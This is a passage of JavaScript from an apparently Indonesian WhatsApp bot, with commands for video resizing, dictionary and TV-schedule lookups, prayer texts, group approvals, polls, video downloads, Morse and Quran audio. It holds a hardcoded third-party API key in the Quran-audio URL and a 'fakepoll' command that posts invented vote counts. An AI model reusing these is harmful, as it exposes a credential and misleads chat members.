    let newHeight = Math.round(newWidth / aspectRatio)
    await conn.sendMessage(m.chat, { text: `Sedang meresize video ke *${newWidth}x${newHeight}*...` }, { quoted: m })
    await new Promise((resolve, reject) => {
      const ffmpeg = spawn('ffmpeg', ['-i', inputPath, '-vf', `scale=${newWidth}:${newHeight}`, '-preset', 'fast', outputPath])
      ffmpeg.on('close', code => code === 0 ? resolve() : reject(new Error('FFmpeg gagal meresize video')))
    })
    await conn.sendMessage(m.chat, {
      video: fs.readFileSync(outputPath),
      mimetype: 'video/mp4',
      caption: `Berhasil resize video ke *${newWidth}x${newHeight}*`
    }, { quoted: m })
    fs.unlinkSync(inputPath)
    fs.unlinkSync(outputPath)
  } catch (err) {
    console.error(err)
    conn.sendMessage(m.chat, {
      text: `Gagal resize video:\n\n${err.message}`
    }, { quoted: m })
  }
}
break
case 'kamusarab': {
  if (!text) return m.reply('Contoh: kamusarab meja');
  let res = await fetch(`https://beta.anabot.my.id/api/search/kamusArab?query=${encodeURIComponent(text)}&apikey=freeApikey`);
  let json = await res.json();
  if (!json?.data?.result || json.data.result.length === 0) return m.reply('Tidak ditemukan hasil.');
  let hasil = json.data.result.map((v, i) => `${i + 1}. *${v.arti}*\n${v.arab}`).join('\n\n');
  let info = `*Kamus Arab - ${text}*\n\n${hasil}`;
  m.reply(info);
}
  break

case 'jadwaltv': {
  if (!text) return m.reply(`Masukkan nama channel!\nContoh: ${prefix}rcti`)
  try {
  const axios = require('axios');
const cheerio = require('cheerio');
    const channel = text.toLowerCase()
    const url = `https://www.jadwaltv.net/channel/${channel}`
    const res = await axios.get(url)
    const $ = cheerio.load(res.data)
    let hasil = ''
    $('table tbody tr').each((i, el) => {
      const jam = $(el).find('td').eq(0).text().trim()
      const acara = $(el).find('td').eq(1).text().trim()
      if (jam && acara && jam.toLowerCase() !== 'jam' && acara.toLowerCase() !== 'acara') {
        hasil += `🕒 ${jam} - ${acara}\n`
      }
    })
    if (!hasil) return m.reply('❌ Channel tidak ditemukan atau tidak ada jadwalnya.')
    m.reply(`📺 *Jadwal ${channel.toUpperCase()} Hari Ini:*\n\n${hasil}`)
  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal mengambil data atau server error.')
  }
}
break
case "niatsholat": case "niatshalat": {
    if (!q) return m.reply(`Contoh Penggunaan :\nniatsholat Subuh\n\n List :\n• subuh\n• maghrib\n• dzuhur\n• isha\n• ashar`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    m.reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

case 'acc': {
if (!m.isGroup) return m.reply('Fitur ini hanya untuk grup!')
const args = text.trim().split(' ')
const subcmd = args[0]?.toLowerCase()
if (!subcmd) {
return m.reply(
`Gunakan perintah dengan format berikut:\n\n` +
`• *.acc all* — Terima semua\n` +
`• *.acc 10* — Terima 10 pertama\n` +
`• *.acc non all* — Tolak semua\n` +
`• *.acc non 10* — Tolak 10 pertama\n`
)
}
const pending = await conn.groupRequestParticipantsList(m.chat)
if (!pending || pending.length === 0) return m.reply('Tidak ada yang menunggu persetujuan.')
let listTarget = []
if (subcmd === 'all') {
listTarget = pending.map(p => p.jid)
await conn.groupRequestParticipantsUpdate(m.chat, listTarget, 'approve')
m.reply(`Berhasil menyetujui ${listTarget.length} orang.`)
} else if (subcmd === 'non' && args[1] === 'all') {
listTarget = pending.map(p => p.jid)
await conn.groupRequestParticipantsUpdate(m.chat, listTarget, 'reject')
m.reply(`Berhasil menolak ${listTarget.length} orang.`)
} else if (!isNaN(subcmd)) {
let jumlah = parseInt(subcmd)
listTarget = pending.slice(0, jumlah).map(p => p.jid)
await conn.groupRequestParticipantsUpdate(m.chat, listTarget, 'approve')
m.reply(`Berhasil menyetujui ${listTarget.length} orang.`)
} else if (subcmd === 'non' && args[1] === '1p') {
listTarget = pending.slice(0, 10).map(p => p.jid)
await conn.groupRequestParticipantsUpdate(m.chat, listTarget, 'reject')
m.reply(`Berhasil menolak ${listTarget.length} orang.`)
} else {
m.reply(`Perintah tidak dikenali.\nContoh:\n• *.acc all*\n• *.acc 10*\n• *.acc non all*\n• *.acc non 10*`)
}
}
break
case 'warga': case 'wargagroup': case 'wargagb':  {
  if (!m.isGroup) return m.reply('Fitur ini hanya untuk grup!');
  const group = await conn.groupMetadata(m.chat);
  const members = group.participants;
const kodeNegaraMap = {
  '1': 'Amerika Serikat / Kanad a',
  '7': 'Rusia / Kazakhstan',
  '20': 'Mesir',
  '27': 'Afrika Selatan',
  '30': 'Yunani',
  '31': 'Belanda',
  '32': 'Belgia',
  '33': 'Perancis',
  '34': 'Spanyol',
  '36': 'Hungaria',
  '39': 'Italia',
  '40': 'Rumania',
  '41': 'Swiss',
  '43': 'Austria',
  '44': 'Inggris',
  '45': 'Denmark',
  '46': 'Swedia',
  '47': 'Norwegia',
  '48': 'Polandia',
  '49': 'Jerman',
  '51': 'Peru',
  '52': 'Meksiko',
  '53': 'Kuba',
  '54': 'Argentina',
  '55': 'Brasil',
  '56': 'Chili',
  '57': 'Kolombia',
  '58': 'Venezuela',
  '60': 'Malaysia',
  '61': 'Australia',
  '62': 'Indonesia',
  '63': 'Filipina',
  '64': 'Selandia Baru',
  '65': 'Singapura',
  '66': 'Thailand',
  '81': 'Jepang',
  '82': 'Korea Selatan',
  '84': 'Vietnam',
  '86': 'Tiongkok',
  '90': 'Turki',
  '91': 'India',
  '92': 'Pakistan',
  '93': 'Afghanistan',
  '94': 'Sri Lanka',
  '95': 'Myanmar',
  '98': 'Iran',
  '211': 'Sudan Selatan',
  '212': 'Maroko',
  '213': 'Aljazair',
  '216': 'Tunisia',
  '218': 'Libya',
  '220': 'Gambia',
  '221': 'Senegal',
  '222': 'Mauritania',
  '223': 'Mali',
  '224': 'Guinea',
  '225': 'Pantai Gading',
  '226': 'Burkina Faso',
  '227': 'Niger',
  '228': 'Togo',
  '229': 'Benin',
  '230': 'Mauritius',
  '231': 'Liberia',
  '232': 'Sierra Leone',
  '233': 'Ghana',
  '234': 'Nigeria',
  '235': 'Chad',
  '236': 'Republik Afrika Tengah',
  '237': 'Kamerun',
  '238': 'Tanjung Verde',
  '239': 'Sao Tome dan Principe',
  '240': 'Guinea Khatulistiwa',
  '241': 'Gabon',
  '242': 'Kongo (Republik)',
  '243': 'Kongo (DRC)',
  '244': 'Angola',
  '245': 'Guinea-Bissau',
  '246': 'Diego Garcia',
  '247': 'Ascension Island',
  '248': 'Seychelles',
  '249': 'Sudan',
  '250': 'Rwanda',
  '251': 'Ethiopia',
  '252': 'Somalia',
  '253': 'Djibouti',
  '254': 'Kenya',
  '255': 'Tanzania',
  '256': 'Uganda',
  '257': 'Burundi',
  '258': 'Mozambik',
  '260': 'Zambia',
  '261': 'Madagaskar',
  '262': 'Réunion',
  '263': 'Zimbabwe',
  '264': 'Namibia',
  '265': 'Malawi',
  '266': 'Lesotho',
  '267': 'Botswana',
  '268': 'Eswatini',
  '269': 'Komoro',
  '290': 'Saint Helena',
  '291': 'Eritrea',
  '297': 'Aruba',
  '298': 'Faroe Islands',
  '299': 'Greenland',
  '350': 'Gibraltar',
  '351': 'Portugal',
  '352': 'Luksemburg',
  '353': 'Irlandia',
  '354': 'Islandia',
  '355': 'Albania',
  '356': 'Malta',
  '357': 'Siprus',
  '358': 'Finlandia',
  '359': 'Bulgaria',
  '370': 'Lituania',
  '371': 'Latvia',
  '372': 'Estonia',
  '373': 'Moldova',
  '374': 'Armenia',
  '375': 'Belarus',
  '376': 'Andorra',
  '377': 'Monako',
  '378': 'San Marino',
  '380': 'Ukraina',
  '381': 'Serbia',
  '382': 'Montenegro',
  '385': 'Kroasia',
  '386': 'Slovenia',
  '387': 'Bosnia dan Herzegovina',
  '389': 'Makedonia Utara',
  '420': 'Ceko',
  '421': 'Slovakia',
  '423': 'Liechtenstein',
  '850': 'Korea Utara',
  '852': 'Hong Kong',
  '853': 'Makau',
  '855': 'Kamboja',
  '856': 'Laos',
  '880': 'Bangladesh',
  '886': 'Taiwan',
  '960': 'Maladewa',
  '961': 'Lebanon',
  '962': 'Yordania',
  '963': 'Suriah',
  '964': 'Irak',
  '965': 'Kuwait',
  '966': 'Arab Saudi',
  '967': 'Yaman',
  '968': 'Oman',
  '971': 'Uni Emirat Arab',
  '972': 'Israel',
  '973': 'Bahrain',
  '974': 'Qatar',
  '975': 'Bhutan',
  '976': 'Mongolia',
  '977': 'Nepal'
};
  let negaraStat = {};
  for (let member of members) {
    const id = member.id.split('@')[0];
    let kode = Object.keys(kodeNegaraMap).find(k => id.startsWith(k));
    let negara = kode ? kodeNegaraMap[kode] : 'Tidak Diketahui';
    if (!negaraStat[negara]) negaraStat[negara] = 0;
    negaraStat[negara]++;
  }
  let teks = `*Warga Grup: ${group.subject}*\n`;
  teks += `Total Member: *${members.length}*\n\n`;
  teks += `*Asal Negara:*\n`;
  let urutan = Object.entries(negaraStat)
    .sort((a, b) => b[1] - a[1]) 
    .map(([negara, jumlah], i) => `${i + 1}. ${negara} - ${jumlah} orang`)
    .join('\n');
  teks += urutan;
  m.reply(teks);
}
break
case 'fakepoll': case 'fakepolling': {
    if (!text.includes('|')) return m.reply(`*Contoh:* .fakepoll Judul Polling|Opsi A:120|Opsi B:350|Opsi C:75`)
    let [title, ...opsi] = text.split('|').map(v => v.trim())
    if (!title || opsi.length < 1) return m.reply('Judul dan minimal 1 hasil opsi diperlukan!')
    let hasil = []
    for (let x of opsi) {
        let [nama, suara] = x.split(':')
        if (!nama || isNaN(suara)) return m.reply(`Format opsi salah di: ${x}\nGunakan format Opsi:Jumlah`)
        hasil.push([nama.trim(), Number(suara)])
    }
    await conn.sendMessage(m.chat, {
        pollResult: {
            name: title,
            values: hasil
        }
    }, { quoted: m })
}
break
case 'poll':
case 'polling': {
    if (!text.includes('|')) return m.reply(`*Contoh:* .poll Siapa terbaik?|Biyu|Kamu|Dia`)
    let [question, ...choices] = text.split('|').map(v => v.trim())
    if (!question || choices.length < 2) return m.reply('Pertanyaan dan minimal 2 opsi diperlukan!')
    let targetJid = m.chat 
    await conn.sendMessage(targetJid, {
        poll: {
            name: question,
            values: choices,
            selectableCount: 1,
            toAnnouncementGroup: true
        },
        viewOnce: true
    }, { quoted: m })
}
    break
case 'ytdownload': {
    if (!q) return m.reply(`Masukkan URL video YouTube!\n\nContoh: ${prefix + command} https://music.youtube.com/watch?v=j85pwTA5Ipw`);

    m.reply('Sedang Memproses...');
const axios = require('axios');
const bytes = require('bytes');
    try {
        const base_url = "https://api.downloadbazar.com";
        function _validateUrl(url) {
            if (!url || typeof url !== 'string') {
                throw new Error('URL nya harus variabel string :(');
            }

            try {
                new URL(url);
            } catch (e) {
                throw new Error(`Ngawur ah linknya nih: ${url}`);
            }
        }
        async function getVideoInfo(url) {
            _validateUrl(url);

            try {
                const response = await axios.get(`${base_url}/video_info`, { params: { url } });
                return response.data.data;
            } catch (error) {
                console.error('Gagal dapetin info video, nih error:', error.response?.data || error.message);
                throw error;
            }
        }
        async function startDownload(options) {
            try {
                const response = await axios.post(`${base_url}/download/`, options);
                return response.data;
            } catch (error) {
                console.error('Maaf belum bisa donlod videonya, nih error:', error.response?.data || error.message);
                throw error;
            }
        }
        async function checkDownloadStatus(taskId) {
            if (!taskId) {
                throw new Error('Task ID nya ngilang jir');
            }

            try {
                const response = await axios.get(`${base_url}/download-status/${taskId}`);
                return response.data;
            } catch (error) {
                throw new Error('Gagal ngecek status donlodnya, cek errornya:' + error.response?.data || error.message);
            }
        }
        function formatSize(n) {
            return bytes(+n, { unitSeparator: ' ' });
        }
        function timeToSeconds(timeStr) {
            if (!timeStr) return 0;
            if (!isNaN(timeStr)) return parseInt(timeStr);
            const parts = timeStr.split(':').map(part => parseInt(part));
            if (parts.length === 3) {
                return parts[0] * 3600 + parts[1] * 60 + parts[2];
            } else if (parts.length === 2) {
                return parts[0] * 60 + parts[1];
            } else if (parts.length === 1) {
                return parts[0];
            }
            return 0;
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        function _validateFormatId(formatId, fieldName) {
            if (formatId === undefined || formatId === null) return null;
            if (typeof formatId !== 'string' && typeof formatId !== 'number') {
                throw new Error(`${fieldName} harus variabel string atau ga ya number`);
            }
            return String(formatId);
        }
        function _validateBoolean(value, fieldName, defaultValue = false) {
            if (value === undefined || value === null) return defaultValue;
            if (typeof value === 'boolean') return value;
            if (value === 'true') return true;
            if (value === 'false') return false;
            console.warn(`Ini salah ${fieldName}: ${value}. pake default aja ya: ${defaultValue}`);
            return defaultValue;
        }
        async function processYouTubeDownload(params) {
            try {
                _validateUrl(params.url);
                const { url, videoFormatId = null, audioFormatId = null, isTrim = false, startTime = '0', endTime = '0' } = params;
                const validatedVideoFormatId = _validateFormatId(videoFormatId, 'videoFormatId');
                const validatedAudioFormatId = _validateFormatId(audioFormatId, 'audioFormatId');
                if (!validatedVideoFormatId && !validatedAudioFormatId) {
                    throw new Error('Setidaknya salah satu antara videoFormatId atau ga ya audioFormatId harus di input');
                }
                const validatedIsTrim = _validateBoolean(isTrim, 'isTrim');
                const videoInfo = await getVideoInfo(url);
                const downloadOptions = {
                    url,
                    is_trim: validatedIsTrim,
                    format_id: validatedVideoFormatId || validatedAudioFormatId,
                    audio_format_id: validatedAudioFormatId,
                    start_time: validatedIsTrim ? timeToSeconds(startTime) : 0,
                    end_time: validatedIsTrim ? timeToSeconds(endTime) : 0
                };
                if (validatedIsTrim) {
                    const startTimeSeconds = timeToSeconds(startTime);
                    const endTimeSeconds = timeToSeconds(endTime);
                    if (endTimeSeconds > 0 && endTimeSeconds <= startTimeSeconds) {
                        throw new Error('Durasi akhir harus lebih gede dari durasi awal, enak kali kau masukin angka random');
                    }
                    if (videoInfo.duration && endTimeSeconds > videoInfo.duration) {
                        throw new Error(`Waktu akhir (${endTimeSeconds} detik) melebih durasi video (${videoInfo.duration} detik)`);
                    }
                }
                const downloadTask = await startDownload(downloadOptions);
                if (!downloadTask.success) {
                    throw new Error("Ngawur jir servernya, cek webnya sana, barangkali lagi ngambek");
                }
                if (downloadTask.state === "downloadable") {
                    const downloadableResult = {
                        videoId: videoInfo.id,
                        title: videoInfo.title,
                        duration: videoInfo.duration,
                        thumbnail: videoInfo.thumbnail,
                        url: downloadTask.data.downloadable_url
                    };

                    return downloadableResult;
                }
                const taskId = downloadTask.data.task_id;
                let isComplete = false;
                let downloadUrl = '';
                let attempts = 0;
                const maxAttempts = 100;
                while (!isComplete && attempts < maxAttempts) {
                    const status = await checkDownloadStatus(taskId);
                    console.log(`Sabar ya, lagi proses di ${status.progress}`);
                    if (status.state === 'uploaded') {
                        isComplete = true;
                        downloadUrl = status.data.downloadable_url;
                    } else if (status.state === 'failed') {
                        break;
                    } else {
                        attempts++;
                        await sleep(2000);
                    }
                }
                if (!isComplete) {
                    throw new Error("Ga tau deh, error dari sononya, coba video yang lain aja");
                }
                const result = {
                    videoId: videoInfo.id,
                    title: videoInfo.title,
                    duration: videoInfo.duration,
                    thumbnail: videoInfo.thumbnail,
                    url: downloadUrl
                };
                return result;
            } catch (error) {
                throw new Error('Prosesnya error wak:' + error.message);
            }
        }
        const download = await processYouTubeDownload({
            url: q,
            videoFormatId: '399',  
            audioFormatId: '140'   
        });
        await conn.sendMessage(m.chat, {
            video: { url: download.url },
            caption: `Berikut adalah video yang berhasil diunduh: ${download.title}`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        m.reply('Gagal memproses video. Coba lagi nanti!');
    }
}
break
case 'morse': {
  if (!text) return m.reply('Contoh: morse biyu')
  const morseMap = {
    A: '.-',     B: '-...',   C: '-.-.',   D: '-..',
    E: '.',      F: '..-.',   G: '--.',    H: '....',
    I: '..',     J: '.---',   K: '-.-',    L: '.-..',
    M: '--',     N: '-.',     O: '---',    P: '.--.',
    Q: '--.-',   R: '.-.',    S: '...',    T: '-',
    U: '..-',    V: '...-',   W: '.--',    X: '-..-',
    Y: '-.--',   Z: '--..',
    0: '-----', 1: '.----', 2: '..---', 3: '...--',
    4: '....-', 5: '.....', 6: '-....', 7: '--...',
    8: '---..', 9: '----.',
    ' ': '/'
  }
  const input = text.toUpperCase()
  let chart = ''
  let morseOnly = ''
  for (let char of input) {
    if (morseMap[char]) {
      const morse = morseMap[char].replace(/\./g, '•')
      chart += `• ${char} = ${morse}\n`
      morseOnly += `${morse} `
    }
  }
  m.reply(`Morse dari *${text}*:\n\n${chart.trim()}\n\n\`\`\`\n${morseOnly.trim()}\n\`\`\``)
}
break
case "audiosurah": case "audiosurat": {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return m.reply(`${wrong}`)
      m.reply(mess.wait)
   conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break
case 'on4t':
  if (!q) return m.reply('Link-nya mana, Bos? Kasih link dong!')
  let reactionMsg
  try {
    reactionMsg = await conn.sendMessage(m.chat, { react: { text: '🌹', key: m.key } }) 
    async function fetchInitialPage(initialUrl) {
      try {
        const axios = require('axios')
        const cheerio = require('cheerio')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': initialUrl,
        }
        const response = await axios.get(initialUrl, { headers })
        const $ = cheerio.load(response.data)
        const csrfToken = $('meta[name="csrf-token"]').attr('content')
        if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')
        let cookies = ''
        if (response.headers['set-cookie']) {
          cookies = response.headers['set-cookie'].join('; ')
        }
        return { csrfToken, cookies }
      } catch (error) {
        throw new Error(`Gagal ambil halaman awal: ${error.message}`)
      }
    }
    async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
      try {
        const axios = require('axios')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': 'https://on4t.com/online-video-downloader',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': '*/*',
          'X-Requested-With': 'XMLHttpRequest',
          'Cookie': cookies
        }
        const postData = new URLSearchParams()
        postData.append('_token', csrfToken)
        postData.append('link[]', userUrl)
        const response = await axios.post(downloadUrl, postData.toString(), { headers })
        if (response.data?.result?.length) {
          return response.data.result.map(item => ({
            title: item.title,
            thumb: item.image,
            url: item.video_file_url || item.videoimg_file_url
          }))
        } else {
          throw new Error('Respons dari server gak sesuai harapan, coba link lain!')
        }
      } catch (error) {
        throw new Error(`Gagal proses permintaan download: ${error.message}`)
      }
    }
    async function sendMediaAutoType(url, title) {
      try {
        const axios = require('axios')
        const { fromBuffer } = require('file-type')   
        const res = await axios.get(url, { responseType: 'arraybuffer' })
        const buff = Buffer.from(res.data)
        const fileInfo = await fromBuffer(buff)
        if (!fileInfo) return m.reply(`Gagal deteksi tipe file: ${title}`)
        let mime = fileInfo.mime
        let ext = fileInfo.ext
        if (mime.startsWith('video/')) {
          await conn.sendMessage(m.chat, { video: buff, caption: title }, { quoted: m })
        } else if (mime.startsWith('audio/')) {
          await conn.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: m })
        } else if (mime.startsWith('image/')) {
          await conn.sendMessage(m.chat, { image: buff, caption: title }, { quoted: m })
        } else {
          await conn.sendMessage(m.chat, {
            document: buff,
            fileName: `${title}.${ext}`,
            mimetype: mime
          }, { quoted: m })
        }
      } catch (err) {
        m.reply(`Gagal kirim media: ${err.message}`)
      }
    }
    const initialUrl = 'https://on4t.com/online-video-downloader'
    const downloadUrl = 'https://on4t.com/all-video-download'
    const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
    const results = await postDownloadRequest(downloadUrl, q, csrfToken, cookies)
    for (let i = 0; i < results.length; i++) {
      await sendMediaAutoType(results[i].url, results[i].title)
    }
    await conn.sendMessage(m.chat, { react: { text: '💕', key: m.key } })
  } catch (err) {
    await conn.sendMessage(m.chat, { react: { text: '😳', key: m.key } }) 
    m.reply(err.message)
  }
  break
//=========================================\\
case 'totalfitur': {
    try {
        let total = totalfitur();
        m.reply(`*Total fitur aktif saat ini:* ${total} fitur!`);
    } catch (e) {
        m.reply(`Gagal membaca total fitur:\n${e.message}`);
    }
}
break

case "ayatkursi": {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  m.reply(caption)
}
break
//=========================================\\
case "bacaansholat": case "bacaanshalat": {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
